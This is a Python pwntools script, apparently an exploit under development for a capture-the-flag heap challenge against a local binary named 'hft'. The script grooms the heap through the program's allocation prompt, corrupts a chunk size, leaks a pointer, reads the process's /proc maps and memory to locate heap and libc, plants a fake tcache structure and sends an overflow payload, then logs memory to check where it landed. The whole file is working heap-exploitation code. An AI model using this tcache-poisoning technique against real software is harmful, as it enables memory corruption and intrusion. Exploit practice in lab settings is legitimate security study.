import os, sys, struct
from pwn import *
context.log_level = 'info'
context.arch = 'amd64'
HERE = './_z_441'
io = process(os.path.join(HERE, 'hft'), env={})

def rd(addr, n):
    with open('/proc/%d/mem' % io.pid, 'rb') as f:
        f.seek(addr)
        return f.read(n)

def regions():
    out = []
    for line in open('/proc/%d/maps' % io.pid):
        p = line.split()
        a, b = [int(x, 16) for x in p[0].split('-')]
        out.append((a, b, p[1], p[-1] if len(p) > 5 else ''))
    return out

def maps(pat):
    for a, b, perm, name in regions():
        if pat in name:
            return a
    return None

def alloc(size, data=b''):
    io.recvuntil(b"PKT_RES")
    io.send(p64(size))
    io.send(bytes(data) + b"\n")

def echo():
    io.recvuntil(b"PKT_DATA\x1b[m:[")
    buf = io.recvuntil(b"\x1b[1;34mPKT_INFO", drop=True)
    return buf[:-2]

ECHO6 = b"\x01" + b"\x00"*5
alloc(0x10, b"\x00"*8)
alloc(0x10, p64(0) + p64(0) + p64(0xd31))
alloc(0x1000, b"\x00"*8)
alloc(0x8, ECHO6)
leak = u64(echo()[:6].ljust(8, b"\x00"))
heap = maps('[heap]')
libc_base = maps('441_libc.so.6')
log.info("heap=%#x libc=%#x" % (heap, libc_base))
fake_tcache = heap + 0x22020
st = bytearray(0x290)
def sc(i, v): st[2*i] = v & 0xff; st[2*i+1] = (v >> 8) & 0xff
def se(i, v): st[0x80+8*i:0x88+8*i] = p64(v)
sc(0, 1); se(0, heap + 0x2e0)
sc(63, 1); se(63, fake_tcache - 0x10)
alloc(0x1000, bytes(st[8:0x290]))

payload = b"A"*0x316e0 + p64(fake_tcache)
alloc(0x30001, payload)
log.info("payload len = %#x" % len(payload))
for a, b, perm, name in regions():
    if 'rw' in perm and name == '' and a < libc_base and a > libc_base - 0x100000:
        log.info("anon region %#x-%#x" % (a, b))
        d = rd(a, b - a)
        i = d.find(b"A"*64)
        log.info("   'A' run starts at %#x" % ((a+i) if i >= 0 else 0))
        # find last A
        j = len(d) - 1
        while j >= 0 and d[j] != 0x41:
            j -= 1
        log.info("   last 'A' at %#x" % (a+j))
        log.info("   tail: " + d[max(0, j-8):j+0x40].hex())
        log.info("   target(0x..a6f8) = %#x" % u64(rd(libc_base-0x2908, 8)))
io.close()
